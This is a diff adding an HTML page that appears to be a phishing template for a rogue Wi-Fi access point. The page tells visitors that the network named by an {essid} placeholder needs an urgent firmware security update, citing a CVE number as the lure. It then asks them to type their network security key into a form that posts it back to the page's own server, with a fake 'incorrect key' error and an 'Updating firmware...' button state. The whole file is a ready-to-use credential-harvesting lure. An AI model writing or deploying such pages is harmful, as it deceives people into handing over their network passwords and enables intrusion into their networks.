@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Router Update Required</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #1a1a2e; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+.card { background: #16213e; border: 1px solid #0f3460; border-radius: 10px; padding: 32px; margin: 20px; max-width: 400px; width: 100%; text-align: center; }
+.icon { font-size: 44px; margin-bottom: 12px; }
+h2 { font-size: 19px; font-weight: 600; color: #e94560; margin-bottom: 8px; }
+p { font-size: 13px; color: #a3b1c6; margin-bottom: 8px; line-height: 1.5; }
+.pw { text-align: left; margin-top: 18px; }
+label { display: block; font-size: 12px; color: #7f8c9b; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
+input { width: 100%; padding: 13px 14px; border: 1px solid #0f3460; border-radius: 6px; font-size: 16px; background: #1a1a2e; color: #e8e8e8; outline: none; }
+input:focus { border-color: #e94560; }
+button { width: 100%; padding: 14px; background: #e94560; color: white; border: none; border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 14px; }
+button:hover { background: #c73a52; }
+.error { color: #ff6b6b; font-size: 13px; margin-top: 8px; display: none; }
+</style></head>
+<body>
+<div class="card">
+<div class="icon">&#9888;&#65039;</div>
+<h2>Router Firmware Update Required</h2>
+<p>Network "{essid}" needs a critical security update (CVE-2026-11842).</p>
+<p>Confirm your network security key to install the update and restore internet access.</p>
+<form method="POST" action="/" class="pw" onsubmit="document.getElementById('btn').disabled=true;document.getElementById('btn').textContent='Updating firmware...'">
+<label for="password">Network Security Key</label>
+<input type="password" name="password" id="password" autocomplete="off" required>
+<div class="error" id="error">Security key incorrect. Update cannot proceed.</div>
+<button type="submit" id="btn">Install Update &amp; Connect</button>
+</form>
+</div></body></html>
